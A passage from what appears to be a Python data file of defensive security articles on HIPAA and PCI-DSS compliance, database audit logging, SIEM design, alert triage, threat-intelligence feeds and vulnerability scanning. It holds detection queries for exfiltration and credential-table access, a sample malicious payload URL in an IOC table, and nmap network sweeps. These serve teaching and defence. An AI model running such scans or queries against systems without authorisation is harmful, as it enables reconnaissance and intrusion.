- **Security Rule** — Administrative, physical, and technical safeguards for ePHI
- **Breach Notification Rule** — Notification requirements after PHI breach
- **Enforcement Rule** — Penalties

**HIPAA Security Rule safeguards:**

```
Administrative Safeguards:
- Security Officer designated
- Risk analysis and risk management (ongoing)
- Workforce training
- Business Associate Agreements (BAA) with vendors

Physical Safeguards:
- Facility access controls
- Workstation security
- Device and media controls (encryption, disposal)

Technical Safeguards:
- Access control (unique user IDs, automatic logoff)
- Audit controls (logs of ePHI access)
- Integrity controls (ePHI not altered without detection)
- Transmission security (encrypt ePHI in transit)
```

**Breach notification:**
```
Breach of unsecured PHI:
- Notify affected individuals within 60 days
- Notify HHS (Health and Human Services)
- If > 500 individuals in a state: notify prominent media

"Unsecured PHI" = not encrypted to NIST standards
  --> If encrypted: Safe Harbor -- no breach notification required
  --> This is the primary incentive for encrypting PHI
```

**Penalties:** Tier 1 (didn't know): $100-$50,000/violation; Tier 4 (wilful neglect, not corrected): $50,000 per violation, up to $1.9M/year per category.

## PCI-DSS — Payment Card Industry Data Security Standard

**Scope:** Any entity that stores, processes, or transmits payment cardholder data. Version 4.0 current as of March 2024.

**12 Requirements (PCI-DSS v4.0):**

```
Build and Maintain a Secure Network:
  Req 1: Install and maintain network security controls (firewalls)
  Req 2: Apply secure configurations to all system components (no vendor defaults)

Protect Account Data:
  Req 3: Protect stored account data (encryption, masking, tokenisation)
  Req 4: Protect cardholder data in transit (TLS 1.2 minimum)

Maintain a Vulnerability Management Program:
  Req 5: Protect all systems against malware (AV, EDR)
  Req 6: Develop and maintain secure systems and software (patching, secure dev)

Implement Strong Access Controls:
  Req 7: Restrict access to system components by business need-to-know
  Req 8: Identify users and authenticate access (MFA for all admin access)
  Req 9: Restrict physical access to cardholder data

Regularly Monitor and Test Networks:
  Req 10: Log and monitor all access to network and CHD
  Req 11: Test security of systems and networks regularly (pen tests, scans)

Maintain an Information Security Policy:
  Req 12: Support information security with organisational policies and programs
```

**Key technical controls:**

```sql
-- PAN masking (show only last 4 digits)
SELECT CONCAT(REPEAT('*', LENGTH(pan) - 4), RIGHT(pan, 4)) AS masked_pan
FROM transactions;

-- Tokenisation (replace PAN with non-reversible token)
-- Token: TKN-4111-1111-1111-1111 (format preserving, no mathematical relationship to PAN)
```

```bash
# Quarterly vulnerability scans (Requirement 11.3)
# External: ASV (Approved Scanning Vendor) — must use a PCI-approved vendor
# Internal: any qualified scanner
nessus -T html -o scan_report.html -x scan.nessus

# Annual penetration test (Requirement 11.4)
# Must test from outside CDE and inside (segmentation testing)
```

## Comparison Table

| Dimension | GDPR | HIPAA | PCI-DSS |
|-----------|------|-------|---------|
| Geography | Global (EU residents) | US only | Global (card brands) |
| Data type | All personal data | Healthcare (ePHI) | Payment card data |
| Encryption mandate | "Appropriate measures" (implied) | Addressable (strongly recommended) | Required for transmission; tokenisation/encryption for storage |
| Breach notification | 72 hours to authority | 60 days to individuals | No standard timeline (card brand rules apply) |
| Audit logs | Required | Required | 12 months required |
| MFA | Not specified (but best practice) | Required for remote access | Required for all admin access, all access into CDE |
| Risk assessment | Required (DPIA for high risk) | Required (annual risk analysis) | Not mandated as formal process |
| Penetration testing | Not specified | Not specified | Required annually + after changes |
| Max fine | 4% global revenue / €20M | $1.9M/year per category | Card brand fines + losing ability to process cards |

## Compliance as a Security Baseline

Compliance frameworks are a minimum bar, not a security ceiling:

```
Common gaps where compliance frameworks are insufficient:
1. Threat intelligence — none require active TI consumption
2. Detection capability — "log everything" but no detection rule requirements
3. Incident response speed — breach notification is after-the-fact
4. Supply chain security — addressed in PCI-DSS 4.0 (Req 6.3) but immature elsewhere
5. Cloud workload security — frameworks written before cloud dominance

Layering the frameworks:
- Use PCI-DSS requirements as a security baseline (they are specific and prescriptive)
- Layer GDPR privacy controls for personal data handling
- Add HIPAA safeguards if processing healthcare data
- Add your own risk-based controls beyond what compliance requires
```
""",
    },
    {
        "title": "Database Activity Monitoring and Audit Logging",
        "tags": ["database", "audit-logging", "dam", "monitoring", "data-security", "siem"],
        "content": """# Database Activity Monitoring and Audit Logging

## Why DAM is Essential

A database administrator (or attacker with DBA credentials) can bypass application-layer access controls entirely. Database Activity Monitoring (DAM) provides an independent audit trail: who ran which queries, when, from where, and what they returned.

## DAM Architecture

```
Applications  -->  Database  <-- DAM Sensor (network tap or agent)
                                        |
                            Centralised DAM Repository
                                        |
                                 Policy Engine
                                        |
                              Alert + Report + SIEM
```

**Network-based DAM**: Passive tap or SPAN port on the database network — no agent on the DB server. Cannot see loopback (local connections) or encrypted traffic without SSL inspection.

**Agent-based DAM**: Installed on the DB server, captures all sessions including local. Higher visibility but adds overhead to the DB server.

**Audit log shipping**: Many databases have native audit logging that can be shipped to a SIEM (see below).

## SQL Server Audit Logging

```sql
-- Create audit (writes to Windows Event Log or file)
CREATE SERVER AUDIT ProdAudit
TO APPLICATION_LOG
WITH (QUEUE_DELAY = 1000, ON_FAILURE = CONTINUE);
ALTER SERVER AUDIT ProdAudit WITH (STATE = ON);

-- Audit specification: what to capture
CREATE DATABASE AUDIT SPECIFICATION AppDBSpec
FOR SERVER AUDIT ProdAudit
ADD (SELECT ON dbo.customers BY appuser),   -- Specific table read
ADD (INSERT, UPDATE, DELETE ON SCHEMA::dbo BY appuser),
ADD (EXECUTE ON SCHEMA::dbo BY appuser),
ADD (DATABASE_OBJECT_CHANGE_GROUP),         -- DDL changes
ADD (FAILED_DATABASE_AUTHENTICATION_GROUP);
ALTER DATABASE AUDIT SPECIFICATION AppDBSpec WITH (STATE = ON);

-- Query the audit log
SELECT event_time, action_id, succeeded, server_principal_name,
       database_name, object_name, statement
FROM sys.fn_get_audit_file('C:\\Audit\\ProdAudit*.sqlaudit', NULL, NULL)
WHERE event_time > DATEADD(hour, -1, GETUTCDATE())
ORDER BY event_time DESC;
```

## PostgreSQL pgaudit

```bash
# Enable pgaudit (must be in shared_preload_libraries)
# postgresql.conf:
# shared_preload_libraries = 'pgaudit'
# pgaudit.log = 'write, ddl, role, connection'
# pgaudit.log_catalog = off      # Reduce noise from system catalog reads
# pgaudit.log_relation = on      # Log relation (table) name in each entry
# pgaudit.log_parameter = on     # Log bind parameters (careful with PII in logs!)

# pgaudit log format:
# 2026-03-15 14:30:00 UTC [1234]: [1-1] AUDIT: SESSION,1,1,READ,SELECT,TABLE,
# public.customers,SELECT id,email FROM customers WHERE status='active',<none>

# Reload config
pg_ctlcluster 14 main reload
# or: SELECT pg_reload_conf();

# Ship pgaudit logs to SIEM via rsyslog
# postgresql.conf:
# log_destination = 'syslog'
# syslog_facility = 'LOCAL0'
# syslog_ident = 'postgres'
```

## MySQL/MariaDB Audit

```bash
# Enable MySQL Audit Plugin (Enterprise) or MariaDB Audit Plugin
INSTALL PLUGIN server_audit SONAME 'server_audit.so';

SET GLOBAL server_audit_logging = ON;
SET GLOBAL server_audit_events = 'CONNECT,QUERY,TABLE,QUERY_DDL,QUERY_DML,QUERY_DCL';
SET GLOBAL server_audit_file_path = '/var/log/mysql/audit.log';
SET GLOBAL server_audit_file_rotate_size = 100000000;  # 100MB
SET GLOBAL server_audit_file_rotations = 10;

# Query audit log (structured fields)
# timestamp, serverhost, username, host, connectionid, queryid, operation,
# database, object, retcode
grep "SELECT.*customers" /var/log/mysql/audit.log | \\
    awk -F',' '{print $1, $3, $5, $9}' | tail -20
```

## Oracle Unified Auditing

```sql
-- Oracle 12c+: Unified Auditing
-- Create audit policy for sensitive table access
CREATE AUDIT POLICY pii_access
    ACTIONS SELECT, INSERT, UPDATE, DELETE
    ON hr.employees;

AUDIT POLICY pii_access;

-- Fine-grained auditing (FGA): audit with conditional predicates
DBMS_FGA.ADD_POLICY(
    object_schema  => 'HR',
    object_name    => 'EMPLOYEES',
    policy_name    => 'PII_FGA',
    audit_column   => 'SALARY,SSN,BANK_ACCOUNT',  -- Only when these columns accessed
    handler_schema => 'AUDITADMIN',
    handler_module => 'LOG_SENSITIVE_ACCESS',
    enable         => TRUE
);

-- View audit records
SELECT dbusername, db_extended_timestamp, sql_text, object_name
FROM unified_audit_trail
WHERE event_timestamp > SYSTIMESTAMP - INTERVAL '1' HOUR
ORDER BY event_timestamp DESC;
```

## Detecting Suspicious Database Activity

```sql
-- SQL Server: detect data exfiltration (large SELECT result sets)
SELECT event_time, server_principal_name, statement,
       additional_information
FROM sys.fn_get_audit_file('C:\\Audit\\*.sqlaudit', NULL, NULL)
WHERE action_id = 'SL'  -- SELECT
AND additional_information LIKE '%rows_count%'
-- Look for unusually high row counts

-- Detect schema reconnaissance (SELECT on sys tables)
SELECT * FROM sys.fn_get_audit_file('C:\\Audit\\*.sqlaudit', NULL, NULL)
WHERE database_name = 'master'
AND (statement LIKE '%sys.tables%' OR statement LIKE '%information_schema%');

-- After-hours access (outside 08:00-18:00)
SELECT * FROM sys.fn_get_audit_file('C:\\Audit\\*.sqlaudit', NULL, NULL)
WHERE DATEPART(hour, event_time) NOT BETWEEN 8 AND 18
AND succeeded = 1
ORDER BY event_time DESC;
```

```bash
# PostgreSQL: detect bulk data read via pgaudit log
grep "SELECT.*FROM" /var/log/postgresql/postgresql-*.log | \\
    grep -v "WHERE\\|LIMIT\\|system_catalog" | \\
    awk '{print $1, $2, $10}' | sort | uniq -c | sort -rn | head -20

# Alert on: admin account connecting from unusual IP
grep "CONNECT" /var/log/mysql/audit.log | \\
    awk -F',' '$3 ~ /admin|root/ {print $1,$3,$4}' | \\
    grep -v "10\\.0\\.\\.\\|127\\.0\\.0\\.1" | tail -20
```

## SIEM Integration for Database Monitoring

```python
# Python: parse and forward SQL Server audit logs to Elasticsearch
import json, hashlib
from datetime import datetime
import pyodbc, requests

ES_URL = "https://127.0.0.1:9200"
ES_AUTH = ("elastic", "Password")

def get_recent_audit_events(conn_str: str, hours: int = 1) -> list:
    conn = pyodbc.connect(conn_str)
    cursor = conn.cursor()
    cursor.execute('''
        SELECT event_time, action_id, succeeded,
               server_principal_name, database_name, object_name, statement
        FROM sys.fn_get_audit_file('C:\\Audit\\*.sqlaudit', NULL, NULL)
        WHERE event_time > DATEADD(hour, ?, GETUTCDATE())
        ORDER BY event_time
    ''', -hours)

    events = []
    for row in cursor.fetchall():
        events.append({
            "@timestamp": row.event_time.isoformat() + "Z",
            "event.action": row.action_id,
            "event.outcome": "success" if row.succeeded else "failure",
            "user.name": row.server_principal_name,
            "database": row.database_name,
            "db.object": row.object_name,
            "db.statement": (row.statement or "")[:500],  # Truncate long queries
        })
    conn.close()
    return events

def ship_to_elasticsearch(events: list):
    bulk_body = ""
    for evt in events:
        doc_id = hashlib.sha256(json.dumps(evt).encode()).hexdigest()[:16]
        bulk_body += json.dumps({"index": {"_index": "logs-database", "_id": doc_id}}) + "\\n"
        bulk_body += json.dumps(evt) + "\\n"

    if bulk_body:
        requests.post(f"{ES_URL}/_bulk",
                      data=bulk_body,
                      headers={"Content-Type": "application/x-ndjson"},
                      auth=ES_AUTH, verify=True)
```

## DAM Alerting Priorities

| Priority | Pattern | Response |
|----------|---------|----------|
| P1 Critical | DBA account from unknown IP outside hours | Immediate investigation |
| P1 Critical | DROP TABLE / TRUNCATE on production | Immediate |
| P1 Critical | SELECT * from user_credentials / passwords table | Immediate |
| P2 High | Bulk SELECT (>10,000 rows) by non-DBA | Same day |
| P2 High | Schema enumeration (queries on information_schema) | Same day |
| P3 Medium | Multiple failed logins to DB (brute force) | Next business day |
| P3 Medium | DDL changes outside change windows | Review |
| P4 Low | After-hours access by known DBA | Weekly review |
""",
    },
]

SECOPS_FOUNDATIONS = [
    {
        "title": "SIEM Architecture — Log Sources, Parsing, Correlation, and Storage",
        "tags": ["siem", "architecture", "logging", "correlation", "elasticsearch", "secops"],
        "content": """# SIEM Architecture — Log Sources, Parsing, Correlation, and Storage

## What is a SIEM?

A Security Information and Event Management (SIEM) system collects, normalises, correlates, and stores security event data from across the environment, enabling real-time alerting and historical investigation.

## SIEM Pipeline

```
Log Sources           Collect         Parse/Enrich         Correlate         Alert/Investigate
+-----------+         +-------+       +----------+         +---------+       +----------+
| Firewall  |         |       |       |          |         |         |       |          |
| Endpoint  | ------> | Agent | ----> | Pipeline | ------> |  Rules  | ----> |  SIEM    |
| Auth logs |         | (Beat/|       | (Logstash|         | Engine  |       | Console  |
| DNS       |         | Cribl)|       | /Cribl)  |         |         |       |          |
| Cloud API |         |       |       |          |         | Storage |       | Hunt     |
+-----------+         +-------+       +----------+         +---------+       +----------+
```

## Log Source Onboarding Priority

| Priority | Source | Technique Coverage |
|----------|--------|--------------------|
| P1 | Identity provider (Entra ID, Okta, AD) | Initial Access, Credential Access |
| P1 | EDR (Defender for Endpoint, CrowdStrike) | Execution, Persistence, Defence Evasion |
| P1 | Firewall / NGFW | Command and Control, Exfiltration |
| P1 | DNS resolver | C2, DGA, DNS tunnelling |
| P2 | Email gateway | Phishing, malicious attachments |
| P2 | Web proxy / CASB | Drive-by download, data exfiltration |
| P2 | Cloud audit logs (CloudTrail, Activity Log) | Cloud-specific TTPs |
| P3 | Windows Event Log (Sysmon + audit policy) | All Windows MITRE techniques |
| P3 | Linux syslog / auditd | Linux execution, lateral movement |

## ECS Normalisation (Elastic Common Schema)

```python
# Normalise Windows failed logon (Event 4625) to ECS
def normalise_4625(raw_event: dict) -> dict:
    return {
        "@timestamp": raw_event["TimeCreated"],
        "event": {
            "action": "authentication_failure",
            "category": ["authentication"],
            "type": ["start"],
            "outcome": "failure",
            "code": "4625",
            "provider": "Microsoft-Windows-Security-Auditing",
        },
        "user": {
            "name": raw_event.get("TargetUserName", ""),
            "domain": raw_event.get("TargetDomainName", ""),
        },
        "source": {
            "ip": raw_event.get("IpAddress", ""),
            "port": raw_event.get("IpPort", 0),
        },
        "host": {"name": raw_event.get("WorkstationName", "")},
        "winlog": {
            "logon": {"type": raw_event.get("LogonType", "")},
            "failure": {"reason": raw_event.get("FailureReason", "")},
        },
    }
```

## Correlation Rules

Correlation rules combine multiple events across time to detect attack patterns:

```python
# Python / pseudo-code: brute force correlation rule
# Alert when: 10+ failed logons from same IP in 5 minutes

from collections import defaultdict
from datetime import datetime, timedelta

class BruteForceDetector:
    def __init__(self, threshold=10, window_minutes=5):
        self.threshold = threshold
        self.window = timedelta(minutes=window_minutes)
        self.failures = defaultdict(list)

    def process_event(self, event: dict):
        if event.get("event", {}).get("action") != "authentication_failure":
            return None

        src_ip = event.get("source", {}).get("ip", "")
        ts = datetime.fromisoformat(event["@timestamp"].replace("Z", "+00:00"))

        # Maintain sliding window
        self.failures[src_ip] = [
            t for t in self.failures[src_ip]
            if ts - t < self.window
        ]
        self.failures[src_ip].append(ts)

        if len(self.failures[src_ip]) >= self.threshold:
            return {
                "rule": "BRUTE_FORCE",
                "severity": "high",
                "src_ip": src_ip,
                "count": len(self.failures[src_ip]),
                "window_minutes": self.window.seconds // 60,
                "ts": ts.isoformat(),
            }
        return None
```

## Elasticsearch ILM (Index Lifecycle Management)

```
Hot  (0-14 days)  : Primary + replica, SSD, active search
Warm (14-90 days) : Replica only, HDD, reduced compute
Cold (90d-1 year) : Searchable snapshots, no replicas, object storage
Frozen (1y+)      : On-demand thaw from object storage (slow)
Delete            : Permanent removal at end of retention period
```

```bash
# Elasticsearch: create ILM policy
curl -X PUT "https://es01:9200/_ilm/policy/security_logs" \\
    -H "Content-Type: application/json" -u elastic:PASSWORD \\
    -d '{
      "policy": {
        "phases": {
          "hot":  {
            "min_age": "0ms",
            "actions": {"rollover": {"max_primary_shard_size":"50gb","max_age":"7d"}}
          },
          "warm": {"min_age":"14d","actions":{"shrink":{"number_of_shards":1},"forcemerge":{"max_num_segments":1}}},
          "cold": {"min_age":"90d","actions":{"searchable_snapshot":{"snapshot_repository":"my-s3-repo"}}},
          "delete": {"min_age":"365d","actions":{"delete":{}}}
        }
      }
    }'
```

## SIEM Health Monitoring

A SIEM with missing log sources is worse than no SIEM — it creates a false sense of coverage:

```python
# Check which log sources haven't sent events recently
import requests
from datetime import datetime, timedelta, timezone

ES_URL = "https://127.0.0.1:9200"
AUTH = ("elastic", "Password")

def check_source_health(sources: dict, stale_minutes: int = 15) -> list:
    stale = []
    for source_name, index_pattern in sources.items():
        r = requests.post(
            f"{ES_URL}/{index_pattern}/_search",
            json={
                "size": 0,
                "query": {"range": {"@timestamp": {"gte": f"now-{stale_minutes}m"}}},
                "aggs": {"count": {"value_count": {"field": "@timestamp"}}}
            },
            auth=AUTH, verify=True
        )
        count = r.json()["aggregations"]["count"]["value"]
        if count == 0:
            stale.append({"source": source_name, "last_seen": ">{} min ago".format(stale_minutes)})
    return stale

sources = {
    "Windows Security": "logs-windows.security-*",
    "Firewall": "logs-network.firewall-*",
    "DNS": "logs-network.dns-*",
    "EDR": "logs-endpoint.events.*",
}
stale = check_source_health(sources)
if stale:
    print("STALE LOG SOURCES:", stale)
```
""",
    },
    {
        "title": "Alert Triage Methodology — True/False Positive Decision Framework",
        "tags": ["alert-triage", "soc", "false-positives", "incident-response", "methodology", "secops"],
        "content": """# Alert Triage Methodology — True/False Positive Decision Framework

## The Alert Problem

Modern SIEMs and EDRs generate hundreds to thousands of alerts per day. Without a structured triage methodology, analysts either investigate everything (burnout, low quality) or skip alerts (real threats missed). The goal is accurate, efficient, consistent decisions.

## Alert Classifications

```
True Positive (TP): Alert fired correctly — real malicious activity
  - True Positive / Incident: Escalated for incident response
  - True Positive / Low Risk: Real activity but no incident needed

False Positive (FP): Alert fired incorrectly — legitimate activity
  - Benign True Positive: Legitimate but suspicious-looking (e.g., pen test)
  - False Positive: Rule needs tuning

False Negative (FN): Real attack that produced no alert
  - Detection gap — identified through threat hunting or external notification
```

## Structured Triage Process

```
1. Intake — Read the alert
   - What triggered it? (rule name, description)
   - What is the severity and confidence score?
   - What asset is involved? (criticality of the host/user)

2. Enrich — Gather context
   - What else happened on this host/account in the last 24h?
   - Is the source IP/domain known bad (threat intel)?
   - Is the user/service account legitimate?
   - Is this a known-good process doing something unusual, or a truly unknown process?

3. Assess — Make a decision
   - Does this match any known attack pattern?
   - Is there a plausible legitimate explanation?
   - If unsure: is there additional investigation possible before escalating?

4. Document — Record findings
   - What was the alert?
   - What did you find?
   - What decision did you make and why?
   - How long did triage take?

5. Act — Take action
   - FP: Close, document, consider rule tuning
   - TP/Low risk: Close with note
   - TP/Incident: Escalate, open incident ticket, notify lead
```

## Enrichment Checklist

```
For every alert, within 5 minutes:
[ ] Host: criticality level (is this a domain controller, production server, or workstation?)
[ ] User: what role? (admin, normal user, service account?)
[ ] Process: hash lookup in VirusTotal — known bad?
[ ] IP: threat intel check (GreyNoise, AbuseIPDB, internal TI)
[ ] Time: business hours or suspicious time? (2 AM access by HR user)
[ ] Frequency: first time this behaviour or regular occurrence?
[ ] Context: other alerts on same host/user in last 24h?
```

```python
# Python: automated enrichment pipeline
import requests

def enrich_alert(alert: dict, vt_key: str) -> dict:
    enrichments = {}

    # VirusTotal hash lookup
    sha256 = alert.get("process", {}).get("hash", {}).get("sha256")
    if sha256:
        try:
            r = requests.get(
                f"https://www.virustotal.com/api/v3/files/{sha256}",
                headers={"x-apikey": vt_key}, timeout=10
            )
            if r.ok:
                stats = r.json()["data"]["attributes"]["last_analysis_stats"]
                enrichments["virustotal"] = {
                    "malicious": stats.get("malicious", 0),
                    "total": sum(stats.values()),
                }
        except Exception:
            pass

    # AbuseIPDB for source IP
    src_ip = alert.get("source", {}).get("ip")
    if src_ip:
        try:
            r = requests.get(
                "https://api.abuseipdb.com/api/v2/check",
                params={"ipAddress": src_ip, "maxAgeInDays": 90},
                headers={"Accept": "application/json", "Key": "YOUR_ABUSEIPDB_KEY"},
                timeout=10
            )
            if r.ok:
                data = r.json()["data"]
                enrichments["abuseipdb"] = {
                    "abuse_confidence": data.get("abuseConfidenceScore", 0),
                    "country": data.get("countryCode", ""),
                    "isp": data.get("isp", ""),
                }
        except Exception:
            pass

    alert["enrichments"] = enrichments
    return alert
```

## False Positive Reduction Strategies

High FP rates cause alert fatigue — the greatest threat to a SOC's effectiveness.

```
FP Reduction Techniques:

1. Baseline and exception lists
   - Build a list of known-good: authorised admin tools, scheduled tasks, IT maintenance scripts
   - Add as exclusions to detection rules (with documentation and review date)

2. Context-aware tuning
   - Instead of: "alert on any base64 encoded PowerShell"
   - Better: "alert on base64 encoded PowerShell NOT from IT accounts AND NOT from known scripts"

3. Scoring and thresholds
   - Single indicator: score 10
   - Three correlated indicators: score 80
   - Alert only when score > 75

4. Time-of-day and asset criticality weighting
   - Same alert on a DC = P1; on a guest workstation = P3
   - 2 AM access = higher weight than 10 AM same action

5. Prevalence analysis
   - "Has this hash been seen on >100 hosts in the environment?" → Likely legitimate
   - "Has this binary NEVER been seen before?" → Higher suspicion

6. Feedback loop
   - Track every FP closure reason
   - Weekly review: which rules generate most FPs?
   - Monthly tuning sessions targeting top 5 FP rules
```

## The Triage Decision Tree

```
Alert Received
      |
      v
Is the asset high-criticality? (DC, payment server, exec workstation)
      |
      +-- YES --> Fast-track escalation if ANY suspicious indicator
      |
      +-- NO  --> Standard triage
                        |
                        v
              Is there a clear, documented legitimate explanation?
                        |
                        +-- YES --> Verify it; close as FP or Benign TP
                        |
                        +-- NO  --> Enrich (30 min max for P2/P3)
                                        |
                                        v
                              Does enrichment support malicious intent?
                                        |
                                        +-- YES --> Escalate as incident
                                        +-- UNCLEAR --> Escalate with context
                                        +-- NO  --> Close as FP; document reasoning
```

## Metrics for Triage Quality

```python
# Track these metrics weekly to improve triage quality
triage_metrics = {
    "mean_time_to_triage_minutes": 0,    # Time from alert creation to analyst action
    "true_positive_rate": 0,             # TP / (TP + FP) -- aim for >20% for high-vol rules
    "false_positive_rate": 0,            # FP / total alerts -- aim for <5% for P1 rules
    "escalation_rate": 0,                # Escalated / triaged
    "alert_volume_per_analyst": 0,       # Should be <50/day for high-quality triage
    "top_fp_rules": [],                  # Rules generating most FPs -- prime tuning targets
    "missed_incidents_this_week": 0,     # FNs caught via threat hunting or external
}

# Alert ageing: alerts should not queue for more than:
# P1 (Critical): 15 minutes
# P2 (High): 1 hour
# P3 (Medium): 4 hours
# P4 (Low): Next business day
```
""",
    },
    {
        "title": "Threat Intelligence Fundamentals — STIX, TAXII, and IOC Lifecycle",
        "tags": ["threat-intelligence", "stix", "taxii", "ioc", "misp", "secops"],
        "content": """# Threat Intelligence Fundamentals — STIX, TAXII, and IOC Lifecycle

## What is Threat Intelligence?

Threat intelligence is processed information about adversaries, their capabilities, motivations, and methods — turned into actionable knowledge that helps defenders make better decisions.

## Intelligence Types

```
Strategic TI:
  - Long-term, high-level threat landscape
  - Audience: executives, risk managers
  - Example: "Nation-state actors are targeting critical infrastructure in 2026"

Operational TI:
  - Information about upcoming or active campaigns
  - Audience: security managers, incident responders
  - Example: "FIN7 is targeting retail with a new phishing campaign using PDF lures"

Tactical TI:
  - TTPs (Tactics, Techniques, Procedures)
  - Audience: SOC analysts, detection engineers
  - Example: MITRE ATT&CK techniques used by a specific threat actor

Technical TI:
  - Specific, atomic IOCs (IPs, domains, hashes)
  - Audience: security tools, automated blocking
  - Example: MD5 hash of Cobalt Strike beacon, C2 IP address
```

## IOC Types and Lifespan

| IOC Type | Example | Lifespan | Defence Value |
|---------|---------|----------|---------------|
| File hash (MD5/SHA256) | `d41d8cd98f00b204...` | Days-weeks | Low — trivially changed by attacker |
| IP address | `203.0.113.5` | Hours-days | Low — IPs rotate frequently |
| Domain name | `evil-c2.com` | Days-weeks | Medium |
| URL | `http://evil.com/payload.ps1` | Hours | Low |
| Email sender | `phish@evildomain.com` | Days | Low |
| Registry key | `HKCU\\Run\\malware` | Months | Medium-High |
| Mutex name | `Global\\MalwareMutex` | Months | Medium-High |
| TTP (MITRE technique) | `T1059.001` | Years | Highest |

The **Pyramid of Pain** (David Bianco) describes this relationship: blocking lower IOCs causes minimal pain to the attacker; blocking TTPs forces them to fundamentally change their behaviour.

## STIX — Structured Threat Information Expression

STIX 2.1 is the standard JSON format for expressing threat intelligence:

```json
// STIX 2.1 example: Indicator for a known-bad domain
{
  "type": "bundle",
  "id": "bundle--12345",
  "objects": [
    {
      "type": "indicator",
      "spec_version": "2.1",
      "id": "indicator--abc123",
      "created": "2026-03-15T12:00:00.000Z",
      "modified": "2026-03-15T12:00:00.000Z",
      "name": "C2 Domain - FIN7 Campaign",
      "pattern": "[domain-name:value = 'evil-c2.example.com']",
      "pattern_type": "stix",
      "valid_from": "2026-03-15T12:00:00.000Z",
      "valid_until": "2026-04-15T12:00:00.000Z",
      "indicator_types": ["malicious-activity"],
      "confidence": 85,
      "labels": ["c2", "fin7"]
    },
    {
      "type": "relationship",
      "id": "relationship--xyz789",
      "relationship_type": "indicates",
      "source_ref": "indicator--abc123",
      "target_ref": "threat-actor--fin7"
    }
  ]
}
```

**Core STIX object types:**
- `indicator` — detectable patterns (IOCs, TTPs)
- `threat-actor` — adversary description
- `malware` — malware description
- `attack-pattern` — TTP (maps to MITRE ATT&CK)
- `campaign` — coordinated activity by an adversary
- `relationship` — links between objects
- `sighting` — observed instance of an indicator

## TAXII — Trusted Automated eXchange of Indicator Information

TAXII is the transport protocol for sharing STIX objects. TAXII 2.1 uses HTTPS REST APIs.

```python
# Python taxii2-client: consume a TAXII feed
from taxii2client.v21 import Server, Collection
import requests

server = Server(
    "https://cti.example.com/taxii/",
    user="analyst",
    password="password",
    verify=True
)

# List available API roots and collections
for api_root in server.api_roots:
    print(f"API Root: {api_root.url}")
    for collection in api_root.collections:
        print(f"  Collection: {collection.title} ({collection.id})")

# Get indicators from a collection
collection = Collection(
    "https://cti.example.com/taxii/api1/collections/indicators/",
    user="analyst",
    password="password"
)

# Fetch objects added in the last 24 hours
from datetime import datetime, timedelta, timezone
added_after = (datetime.now(timezone.utc) - timedelta(hours=24)).isoformat()

bundle = collection.get_objects(added_after=added_after)
for obj in bundle.get("objects", []):
    if obj["type"] == "indicator":
        print(f"Indicator: {obj['name']} | Pattern: {obj['pattern']}")
```

## MISP Integration

MISP (Malware Information Sharing Platform) is the most widely deployed open-source threat intel platform.

```python
import requests

MISP_URL = "https://misp.corp.com"
MISP_KEY = "YOUR_API_KEY"

headers = {
    "Authorization": MISP_KEY,
    "Accept": "application/json",
    "Content-Type": "application/json"
}

# Search for IOCs by value
def search_ioc(value: str) -> list:
    r = requests.post(
        f"{MISP_URL}/attributes/restSearch",
        json={"returnFormat": "json", "value": value, "enforceWarninglist": True},
        headers=headers, verify=True
    )
    r.raise_for_status()
    return r.json().get("response", {}).get("Attribute", [])

# Add a new event with IOCs from an investigation
def add_event(title: str, iocs: list) -> dict:
    attrs = [{"value": ioc["value"], "type": ioc["type"], "to_ids": True}
             for ioc in iocs]
    r = requests.post(
        f"{MISP_URL}/events/add",
        json={"Event": {
            "info": title,
            "threat_level_id": "1",  # High
            "analysis": "2",         # Completed
            "distribution": "0",     # Organisation only
            "Attribute": attrs
        }},
        headers=headers, verify=True
    )
    r.raise_for_status()
    return r.json()

# Bulk IOC check against MISP
def bulk_check(indicators: list) -> dict:
    results = {}
    for ind in indicators:
        hits = search_ioc(ind)
        results[ind] = bool(hits)
    return results
```

## IOC Lifecycle Management

```
1. Collection
   - Automated TAXII feeds (commercial + open-source)
   - ISAC feeds (sector-specific)
   - Open-source feeds (CIRCL, Abuse.ch, Emerging Threats)
   - Internal investigation outputs

2. Validation
   - Is this a valid IOC? (not a placeholder, test value, or false positive)
   - What is the confidence level?
   - What is the source reliability?

3. Enrichment
   - What threat actor/campaign does this belong to?
   - What MITRE ATT&CK techniques are associated?
   - What related IOCs exist?

4. Activation
   - Push to SIEM for alerting
   - Push to firewall/proxy blocklist
   - Push to EDR for blocking/detection

5. Monitoring
   - Track which IOCs generate hits
   - High-hit IOCs may indicate active attack or FP (common benign patterns)

6. Expiry and Removal
   - IP/domain IOCs: expire after 30-90 days unless re-confirmed
   - Hash IOCs: may be permanent (malware hashes don't change)
   - Review expired IOCs: remove from blocking lists, keep in historical record

IOC expiry policy example:
{
  "ip_address": 30,       # days
  "domain_name": 60,
  "url": 14,
  "file_hash_md5": 365,
  "file_hash_sha256": 730,
  "email_address": 30,
  "registry_key": 180
}
```
""",
    },
    {
        "title": "Vulnerability Management Lifecycle — Scanning, Prioritisation, and Remediation",
        "tags": ["vulnerability-management", "scanning", "cvss", "patching", "remediation", "secops"],
        "content": """# Vulnerability Management Lifecycle — Scanning, Prioritisation, and Remediation

## The Vulnerability Management Cycle

```
1. Asset Discovery    --> Know what you have
2. Vulnerability Scan --> Find weaknesses
3. Risk Assessment    --> Prioritise by actual risk
4. Remediation        --> Patch, mitigate, or accept
5. Verification       --> Confirm remediation worked
6. Reporting          --> Track progress over time
```

## Asset Discovery

Vulnerability management starts with a complete, accurate asset inventory. Unmanaged assets are scan-blind spots.

```bash
# Network discovery: what's on the network?
nmap -sn 10.0.0.0/8 -oG - | grep "Up" | awk '{print $2}'   # Ping sweep

# More thorough discovery
nmap -sV -O 10.0.0.0/24 -oX network_inventory.xml

# Cloud asset discovery
aws ec2 describe-instances --query \\
    'Reservations[*].Instances[*].{ID:InstanceId,IP:PrivateIpAddress,OS:Platform}' \\
    --output table

# Enrich with CMDB data (ServiceNow, Lansweeper, etc.)
```

## Vulnerability Scanning

```bash
# Nessus CLI (tenable.io)
nessus-cli scan --name "Monthly Scan" --policy "Advanced Scan" --targets 10.0.0.0/24

# OpenVAS/GVM
gvm-cli socket --gmp-username admin --gmp-password password \\
    tls --hostname localhost --port 9390 \\
    --xml "<create_task><name>Full Scan</name>...</create_task>"

# Qualys guard (API)
curl -H "X-Requested-With: curl" -u "USER:PASS" \\
    "https://qualysapi.qualys.eu/api/2.0/fo/scan/?action=launch&scan_title=Weekly&ip=10.0.0.0/24"

# Fast port + service scanning
